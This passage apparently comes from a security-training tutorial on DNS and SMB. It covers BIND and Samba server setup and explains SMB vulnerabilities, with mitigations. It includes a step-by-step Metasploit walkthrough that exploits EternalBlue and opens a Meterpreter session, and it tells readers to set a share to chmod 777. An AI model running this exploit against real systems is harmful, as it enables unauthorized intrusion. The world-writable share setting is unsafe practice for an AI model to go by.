
DNS is susceptible to various attacks:

* **DNS Spoofing**: Redirecting DNS traffic to a malicious server.
* **DNS Cache Poisoning**: Injecting false DNS records into caching resolvers.
* **DNSSEC (DNS Security Extensions)**: Adds cryptographic authentication to DNS responses to prevent spoofing.

**DNS Security Tools**

* **`dnstap`**: Captures and logs DNS traffic for analysis.
* **`dnstracer`**: Traces the route taken by a DNS query.
* **`dnsdist`**: DNS proxy with DoS protection and load balancing capabilities.

### Building Your Own DNS Server in Linux (BIND)

BIND (Berkeley Internet Name Domain) is a widely used DNS server on Linux. Here's a basic setup example:

**Install BIND**

```bash
sudo apt-get update
sudo apt-get install bind9
```

**Configure BIND**

Edit `/etc/bind/named.conf.options`:

```bash
sudo nano /etc/bind/named.conf.options
```

Example Configuration:

```bind
options {
    listen-on port 53 { 127.0.0.1; 192.168.1.0/24; };
    allow-query { localhost; 192.168.1.0/24; };
    forwarders { 75.75.75.75; };
    recursion yes;
};
```

**Create Zone Files**

1. Forward Zone (`/etc/bind/forward.hackers-arise.local`):

```bind
;
; BIND data file for local loopback interface
;
$TTL    604800
@       IN      SOA     primary.hackers-arise.local. admin.hackers-arise.local. (
                          2024061401     ; Serial
                          604800         ; Refresh
                          86400          ; Retry
                          2419200        ; Expire
                          604800 )       ; Negative Cache TTL
;
@       IN      NS      primary.hackers-arise.local.
@       IN      A       192.168.1.27
www     IN      A       192.168.1.30
```

2. Reverse Zone (`/etc/bind/reverse.hackers-arise.local`):

```bind
;
; BIND reverse data file for local loopback interface
;
$TTL    604800
@       IN      SOA     primary.hackers-arise.local. admin.hackers-arise.local. (
                          2024061401     ; Serial
                          604800         ; Refresh
                          86400          ; Retry
                          2419200        ; Expire
                          604800 )       ; Negative Cache TTL
;
@       IN      NS      primary.hackers-arise.local.
27      IN      PTR     primary.hackers-arise.local.
30      IN      PTR     www.hackers-arise.local.
```

**Restart BIND**

```bash
sudo systemctl restart bind9
```

#### Summary

DNS is vital for translating domain names into IP addresses, facilitating internet navigation. Understanding DNS components, security measures like DNSSEC, vulnerabilities, and setting up a DNS server (e.g., BIND) are crucial for network administrators and security professionals.

### Exercises

1. Modify DNS configuration to add MX records for email servers.
2. Perform a DNSSEC setup for a domain using BIND.
3. Investigate recent CVEs related to DNS vulnerabilities.

***

## Chapter 9: Server Message Block (SMB)

This chapter covers Server Message Block (SMB), a critical yet often misunderstood protocol essential for network functionality and security.

***

### **What is SMB?**

**Server Message Block (SMB)** is an application layer (layer 7) protocol extensively used for sharing files, ports, named pipes, and printers. It operates as a client-server communication protocol, enabling users and applications to share resources over a Local Area Network (LAN). For instance, if one system has a file needed by another system, SMB allows the file to be shared. Additionally, SMB facilitates printer sharing over the LAN and operates over TCP/IP using port 445.

**SMB Characteristics:**

* **Layer**: Application layer (Layer 7)
* **Port**: 445 (TCP/IP)
* **Functionality**: File sharing, printer sharing, named pipe sharing, port sharing
* **Communication Model**: Client-server, request-response

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Clients connect to servers via TCP/IP or NetBIOS. Once a connection is established, clients can send commands to access shares, read and write files, and use printers. Essentially, SMB allows clients to perform their regular tasks over the network.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

***

**History of SMB**

SMB was first developed by IBM in the 1980s and later adopted and adapted by Microsoft for its Windows operating system.

***

### **CIFS: Common Internet File System**

**CIFS (Common Internet File System)** is often confused with SMB. CIFS is a dialect or a specific implementation of the SMB protocol developed by Microsoft for early Windows operating systems. CIFS is now considered obsolete and has been replaced by more modern SMB implementations, such as SMB 2.0 (introduced in 2006 with Windows Vista) and SMB 3.0 (introduced with Windows 8 and Server 2012).

**Evolution of SMB:**

<table><thead><tr><th width="171">Version</th><th width="204">Release Year</th><th>Major Features</th></tr></thead><tbody><tr><td>SMB 1.0</td><td>1980s</td><td>Basic file sharing</td></tr><tr><td>CIFS</td><td>Early 1990s</td><td>Enhanced SMB for early Windows</td></tr><tr><td>SMB 2.0</td><td>2006</td><td>Improved performance, reduced chattiness</td></tr><tr><td>SMB 3.0</td><td>2012</td><td>Enhanced security, better performance, support for larger file sizes</td></tr></tbody></table>

***

### **SMB Vulnerabilities**

SMB, both in Windows and Samba (Linux/Unix), has been a significant source of critical vulnerabilities. Two major Windows vulnerabilities are MS08-067 and EternalBlue, developed by the NSA. These exploits allowed attackers to send specially crafted packets to SMB and execute remote code with system privileges on the target system, effectively taking full control.

**Key Vulnerabilities:**

* **MS08-067**: Allowed remote code execution on Windows systems.
* **EternalBlue (MS17-010)**: Exploited by ransomware like Petya and WannaCry, allowed attackers to execute code remotely on vulnerable Windows systems.

For a detailed examination of the EternalBlue exploit against Windows 7 using Metasploit, see [this tutorial](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue).

Additionally, the Linux/Unix implementation of SMB, known as Samba, has faced significant vulnerabilities. A search for SMB exploits in Metasploit reveals numerous issues, including the infamous MS08-067 and EternalBlue.

For a packet-level analysis of the EternalBlue exploit against SMB on a Windows 7 system, see [this detailed analysis](https://www.hackers-arise.com/post/2018/11/30/network-forensics-part-2-packet-level-analysis-of-the-eternalblue-exploit).

**Detailed Exploitation of SMB Vulnerabilities:**

**MS08-067**:

* **Description**: This vulnerability allows remote code execution if an affected system receives a specially crafted RPC request. It targets the Windows Server service.
* **Technical Details**:
  * **Affected Systems**: Windows 2000, Windows XP, Windows Server 2003.
  * **Attack Vector**: The attacker sends a specially crafted packet to the affected system, exploiting a flaw in the handling of RPC requests.
  * **Mitigation**: Apply the security patch provided by Microsoft.

**EternalBlue (MS17-010)**:

* **Description**: This exploit targets a vulnerability in the SMBv1 protocol, allowing remote attackers to execute arbitrary code on the target system.
* **Technical Details**:
  * **Affected Systems**: Windows XP, Windows Vista, Windows 7, Windows Server 2003, Windows Server 2008.
  * **Attack Vector**: The attacker sends specially crafted packets to the target system, exploiting a flaw in the SMBv1 protocol.
  * **Impact**: The attacker can gain complete control over the affected system, leading to data theft, ransomware installation, and other malicious activities.
  * **Mitigation**: Disable SMBv1 and apply the security patch provided by Microsoft.

**Example: Exploiting EternalBlue with Metasploit**

**Step 1: Set up Metasploit**

```bash
msfconsole
```

**Step 2: Search for EternalBlue Exploit**

```bash
msf > search eternalblue
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Step 3: Select the Exploit**

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
```

**Step 4: Set the Required Options**

```bash
msf exploit(ms17_010_eternalblue) > set RHOST <target_ip>
msf exploit(ms17_010_eternalblue) > set LHOST <your_ip>
```

**Step 5: Launch the Exploit**

```bash
msf exploit(ms17_010_eternalblue) > exploit
```

**Step 6: Post-Exploitation**

* **Meterpreter Session**: Once the exploit is successful, you will have a Meterpreter session, allowing you to execute commands on the target system.

```bash
meterpreter > sysinfo
meterpreter > getuid
```

***

**Building a Samba Server in Kali Linux**

SMB was initially developed by IBM and later adopted by Microsoft. Samba was created to emulate a Windows server on Linux/UNIX systems, enabling resource sharing with Windows systems.

To better understand SMB, we will install, configure, and implement Samba on a Linux system. Here, we use Kali Linux (based on Debian) for demonstration, but the process should work on any Debian-based system, including Ubuntu and other UNIX-like systems.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Steps to Build a Samba Server:**

1.  **Download and Install Samba**

    ```bash
    kali > apt-get install samba
    ```
2.  **Start Samba**

    ```bash
    kali > service smbd start
    ```

    Note: The service name is "smbd" (SMB daemon).
3.  **Configure Samba** Samba configuration is managed via a text file located at `/etc/samba/smb.conf`. Open it with a text editor:

    ```bash
    kali > leafpad /etc/samba/smb.conf
    ```

    Add the following lines to configure your share:

    ```ini
    [HackersArise_share]
    comment = Samba on Hackers-Arise
    path = /home/OTW/HackersArise_share
    read only = no
    browsable = yes
    ```
4.  **Create a Share** Create the shared directory in the user's home directory:

    ```bash
    kali > mkdir /home/OTW/HackersArise_share
    ```

    Change the permissions to allow access to all users:

    ```bash
    kali > chmod 777 /home/OTW/HackersArise_share
    ```

    Restart Samba to apply the changes:

    ```bash
    kali > service smbd restart
    ```
5.  **Accessing the Share from Windows** From any Windows machine on the network, access the share using File Explorer by entering the IP address and share name:

    ```
    \\192.168.1.101\HackersArise_share
    ```

***

**Summary**

SMB is a crucial protocol for file, port, printer, and named pipe sharing on many computer systems. Despite its importance, it is often poorly understood and appreciated, even by cybersecurity professionals. However, its vulnerabilities, exemplified by MS08-067 and EternalBlue, highlight the need for a thorough understanding to protect systems from attacks.

**Exercises**

1. Build a SAMBA server for your domain.

***

